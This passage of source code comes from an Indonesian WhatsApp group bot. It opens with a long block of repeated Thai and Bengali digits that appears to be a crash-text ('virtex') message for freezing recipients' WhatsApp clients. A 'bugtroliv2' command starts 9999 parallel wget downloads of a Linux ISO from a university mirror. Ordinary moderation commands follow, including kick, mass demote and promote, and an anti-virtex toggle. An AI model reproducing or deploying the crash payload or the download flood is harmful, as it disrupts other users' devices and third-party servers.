*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*৭৭৭৭৭৭৭৭* *๒๒๒๒๒๒๒๒* *৭৭৭৭৭৭৭৭*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*
*๒๒๒๒๒๒๒๒* *๑๑๑๑๑๑๑๑*
*๒๒๒๒๒๒๒๒* *๒๒๒๒๒๒๒๒*
*๑๑๑๑๑๑๑๑* *๒๒๒๒๒๒๒๒*`)
break
case 'trolikeun':
  if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
				syaa.toggleDisappearingMessages(from)
				syaa.toggleDisappearingMessages(from)
				break
				case 'bugtroliv2':
				  if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
				for (let i = 0; i < 9999; i++) {
				exec('wget https://ftp.halifax.rwth-aachen.de/blackarch/iso/blackarch-linux-full-2020.12.01-x86_64.iso', (err, stdout) => {
				if (err) throw err
				console.log('🔥SUKSES🔥')
				console.log('🔥') 
				})
				}
				break
      case "autojoin":
        if (!isGroup) return reply("Khusus di grup");
        if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
        if (args[0] == "on") {
          if (autojoin == true) return reply("Sudah aktif!!");
          autojoin = true;
          reply("Sukses mengaktifkan autojoin!");
        } else if (args[0] == "off") {
          autojoin = false;
          reply("Sukses mematikan autojoin!");
        } else if (!q) {
          sendButMessage(from, `MODE AUTOJOIN`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}autojoin on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}autojoin off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "antivirtex":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isAntivirtex) return reply("Sudah aktif!!");
          antivirtex.push(from);
          fs.writeFileSync(
            "./database/antivirtex.json",
            JSON.stringify(antivirtex)
          );
          reply("Sukses mengaktifkan antivirtex!");
        } else if (args[0] == "off") {
          antivirtex.splice(from, 1);
          fs.writeFileSync("./database/antivirtex.json", JSON.stringify(ant));
          reply("Sukses mematikan antivirtex!");
        } else if (!q) {
          sendButMessage(from, `MODE ANTIVIRTEX`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}antivirtex on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}antivirtex off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;
      case "kickarea":
        if (!isGroup) return reply("Khusus di grup");
        if (!isGroupAdmins && !mek.key.fromMe) return reply("Khusus admin");
        if (args[0] == "on") {
          if (isKickarea) return reply("Sudah aktif!!");
          kickarea.push(from);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mengaktifkan kickarea!");
        } else if (args[0] == "off") {
          kickarea.splice(from, 1);
          fs.writeFileSync(
            "./database/antibule.json",
            JSON.stringify(kickarea)
          );
          reply("Sukses mematikan kickarea!");
        } else if (!q) {
          sendButMessage(from, `MODE KICKAREA`, `Silahkan pilih salah satu`, [
            {
              buttonId: `${prefix}kickarea on`,
              buttonText: {
                displayText: `on`,
              },
              type: 1,
            },
            {
              buttonId: `${prefix}kickarea off`,
              buttonText: {
                displayText: `off`,
              },
              type: 1,
            },
          ]);
        }
        break;

      //------------------< Fitur Grup >------------------
      case 'listonline':
             if (!isGroup) return reply(`*Only group*`)
             try {
             let ido = args && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : from
             let online = [...Object.keys(syaa.chats.get(ido).presences), syaa.user.jid]
             syaa.sendMessage(from, '*List Online:*\n' + online.map(v => '- @' + v.replace(/@.+/, '')).join `\n`, text, { quoted: mek, contextInfo: { mentionedJid: online }})
             } catch (e) {
             reply(`${e}`)
}
             break
        /////FUNCTION

//////function end
      case "sider": //copas dari stikerinbot
        if (!m.quoted) throw `Balas pesan bot!`;
        let members = m.quoted.chat.endsWith("g.us")
          ? (await syaa.groupMetadata(m.quoted.chat)).participants.length - 1
          : m.quoted.chat.endsWith("@broadcast")
          ? -1
          : 1;
        let { reads, deliveries } = await syaa.messageInfo(
          m.quoted.chat,
          m.quoted.id
        );
        let txt = `
*Dibaca oleh:*
${reads
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `@${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length} tersisa` : ""}

*Terkirim ke:*
${deliveries
  .sort((a, b) => b.t - a.t)
  .map(({ jid, t }) => `${jid.split`@`[0]}\n_${formatDate(t * 1000)}_`)
  .join("\n")}
${members > 1 ? `${members - reads.length - deliveries.length} tersisa` : ""}
`.trim();
        reply(txt, null, {
          contextInfo: {
            mentionedJid: syaa.parseMention(txt),
          },
        });
        break;
      case "q":
        if (!isOwner && !mek.key.fromMe)return reply(mess.own)
        if (!m.quoted) return reply("reply message!");
        let qse = syaa.serializeM(await m.getQuotedObj());
        if (!qse.quoted)
          return reply("the message you replied does not contain a reply!");
        await qse.quoted.copyNForward(m.chat, true);
        break;
      case "kick":
        case "out":
          case "kik":
            case "keluar":
              if (!isOwner && !mek.key.fromMe) return reply(mess.own)
        if (!isGroup) return reply(mess.only.group);
        if (!isGroupAdmins && !mek.key.fromMe) return reply(mess.admin);
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (
          mek.message.extendedTextMessage === undefined ||
          mek.message.extendedTextMessage === null
        )
          return reply("Tag target yang ingin di kick!");
        mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid;
        if (mentioned.length > 1) {
          syaa.groupRemove(from, mentioned);
          reply(mess.success);
        } else if (mentioned.length < 1) {
          anu = mek.message.extendedTextMessage.contextInfo.participant;
          syaa.groupRemove(from, [anu]);
          reply(mess.success);
        } else {
          syaa.groupRemove(from, mentioned);
          reply(mess.success);
        }
        break;
        case 'add':
  try {
  if (!isGroup) return reply(mess.only.group)
  if (!isGroupAdmins && !isOwner && !mek.key.fromMe) return reply(mess.only.admin)           
  if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
  if (mek.message.extendedTextMessage === null || mek.message.extendedTextMessage === undefined) {
  entah = q.replace(new RegExp("[()+-/ +/]", "gi"), "") + `@s.whatsapp.net`
  response = await syaa.groupAdd(from, [entah])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
if(inv[0].code == 403) return reply('Gagal, Karena Di Private T_T')
if(inv[0].code == 408) return reply('Gagal, Karena Target Baru² Saja Keluar')
if(inv[0].code == 401) return reply('Gagal, Karena Bot Di Block Oleh Target T_T')
} else {
  entah = mek.message.extendedTextMessage.contextInfo.participant
 response = await syaa.groupAdd(from, [entah])
o = response.participants[0]
let inv = (Object.values(o))
if(inv[0].code == 409) return reply('Target Sudah Di Didalam Group!')
if(inv[0].code == 403) return reply('Gagal, Karena Di Private T_T')
if(inv[0].code == 408) return reply('Gagal, Karena Target Baru² Saja Keluar')
if(inv[0].code == 401) return reply('Gagal, Karena Bot Di Block Oleh Target T_T')
}
} catch {
return 
}
  break
      case "getbio":
        var yy = mek.message.extendedTextMessage.contextInfo.participant;
        var p = await syaa.getStatus(`${yy}`, MessageType.text);
        reply(p.status);
        if (p.status == 401) {
          reply("Status Profile Not Found");
        }
        break;
        case 'demoteall':
		if (!isOwner && !mek.key.fromMe) return reply(mess.own)
		if (!isGroup) return reply("Group Obly")
		if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut")
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                syaa.groupDemoteAdmin(from, members_id)
                break
                case "caritau":
teks = args.join(' ')
reply(mess.wait)
res = await ggs({'query' : `${teks}`})
kant = ``
for (let i of res) {
kant += `*Judul* : ${i.title}
*Link* : ${i.link}
*Keterangan* : ${i.snippet}`
}
var akhir = kant.trim()
reply(akhir)
break

      
case "surahAlFatihah":
      case "surahAlBaqarah":
      case "surahAliImran":
      case "surahAyatKursi":
      case "surahAnNisa":
      case "surahAlMa'idah":
      case "surahAlAnam":
      case "surahAlAraf":
      case "surahAlAnfal":
      case "surahAnNas":     
        sendButMessage(from, `Surah Find By @Ikyyyy🗿`, `#JIKA BUTTON TIDAK KELUAR MINTA SAMA OWNER`, [
          {
            buttonId: `/caritau ${command}`,
            buttonText: {
              displayText: `${command}`,
            },
            type: 1,
          },
        ]);
        break;
                case "promoteall":
		if (!isOwner && !mek.key.fromMe) return reply(mess.own)
		if (!isGroup) return reply("Group Obly")
		if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut")
                members_id = []
		for (let mem of groupMembers) {
	   	members_id.push(mem.jid)
	  	}
                syaa.groupMakeAdmin(from, members_id)
                break
case "linkgc":
case "linkgrup":
case "link":
case "linkgrop":
case "linkgroup":
  ///Fix Work By Arasya
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot bukan Admin Cok')
linkgc = await syaa.groupInviteCode(from)
yeh = `\`\`\`「 Link Group 」\`\`\`\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n\n_yo bisa yo ramein, shareee_`
syaa.sendMessage(from, yeh, text, { quoted: mek })
break
      // Get Name
      case "getname":
        var ambl = mek.message.extendedTextMessage.contextInfo.participant;
        const sname =
          syaa.contacts[ambl] != undefined
            ? syaa.contacts[ambl].sname || syaa.contacts[ambl].notify
            : undefined;
        reply(sname);
        break;
      case "setdesc":
        if (!mek.key.fromMe && !isGroupAdmins) return reply("Admin Group Only");
        if (!isBotGroupAdmins) return reply("Jadikan Bot Sebagai Admin Untuk Menggunakan Fitur Tersebut");
        if (!isGroup) return;
        syaa.groupUpdateDescription(from, `${args.join(" ")}`);
        syaa.sendMessage(from, "Succes change description group", text, {
          quoted: mek,
        });
        break;
        case 'setppgrup':
   if (!isGroup) return reply(mess.only.group)
   if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
   if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
   if (isQuotedImage) {
   let encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
   let media = await syaa.downloadMediaMessage(encmedia)
   syaa.updateProfilePicture(from, media)
  .then((res) => reply(jsonformat(res)))
  .catch((err) => reply(jsonformat(err)))
   } else if (isQuotedSticker){
   if (mek.message.videoMessage) return reply('Error Bro Wkwkwk')
   encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
   media = await syaa.downloadAndSaveMediaMessage(encmedia)
   ran = getRandom('.png')
   exec(`ffmpeg -i ${media} ${ran}`, (err) => {
   fs.unlinkSync(media)
   if (err) return reply('Gagal, hehehe')
   buffer = fs.readFileSync(ran)
   syaa.updateProfilePicture(from, buffer)
   fs.unlinkSync(ran)
   })
   } else {
   reply(`Kirim atau tag gambar/sticker dengan caption ${prefix}setppgrup ya sayang 💕`)
   }
   break
        case 'setprofile':
				case 'setpp':
				syaa.updatePresence(from, Presence.composing)
				if (!isQuotedImage) return reply('Reply imagenya!')
					if (!isOwner && !mek.key.fromMe) return reply(mess.own) 
